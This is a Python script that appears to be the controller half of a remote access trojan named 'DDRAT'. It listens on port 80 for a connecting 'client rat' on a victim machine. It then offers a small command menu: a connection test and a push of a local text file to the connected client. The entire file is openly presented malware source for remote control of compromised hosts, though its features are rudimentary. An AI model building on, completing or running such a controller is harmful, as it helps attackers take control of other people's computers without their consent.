#imports
import socket
import os

#Variables
host = ""                    #Server IP (Connect to the client rat by using the attacking pc IP address)
port = 80                    #Choose a port between (1-65535) Default is 80

help_msg = """test: Checks the connection by receiving a message from the client
1: file transfer
use Ctrl+C to keyboard interrupt
"""

#Starting Server
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((host, port))
serversocket.listen(1)
clientsocket, addr = serversocket.accept()

#Functions
def clear():    #Clears the terminal
    os.system('cls' if os.name=='nt' else 'clear')

clear()
print("-+-+-+-+-+DDRAT-+-+-+-+-+")                  #Title card
print("Connection established from: " + str(addr))  #Connection information
print("Welcome to DDRAT! Type help for the command list") #Introductions

def filetransfer():
    filename = 'transferfile.txt'   #Change the file here (text only files for now)
    file = open(filename, 'r')
    file_data = file.read()
    print(file_data)
    return file_data

def menu():
    while True:
            msg = input("\nEnter a command: ")
            file_data = ""
            if msg == "test":
                msg = msg.encode("UTF-8")
                clientsocket.send(msg)               #Sends to client script
                reply = clientsocket.recv(4096).decode("UTF-8")
                print(reply)
                #m = reply.decode("UTF-8")

            elif msg == "1":
                print("1:File Transfer")
                file_data = filetransfer()
                msg += ";" + file_data               #Semi colen splits data for file transfer
                msg = msg.encode("UTF-8")
                clientsocket.send(msg)
            elif msg == "help":
                print("\n-+-+-+-+-+HELP+-+-+-+-+-")
                print(help_msg)
            else:
                print("Unknown Command. type help")
menu()
